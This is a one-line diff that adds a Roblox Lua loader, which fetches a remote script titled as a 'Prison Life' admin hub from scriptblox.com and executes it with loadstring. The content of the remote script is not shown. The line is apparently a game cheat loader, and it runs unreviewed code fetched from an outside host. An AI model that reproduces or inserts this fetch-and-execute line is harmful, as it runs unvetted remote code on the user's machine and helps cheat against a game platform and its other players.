@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://scriptblox.com/raw/Prison-Life-PRISIN-ADMIN-HUB-9197"))()
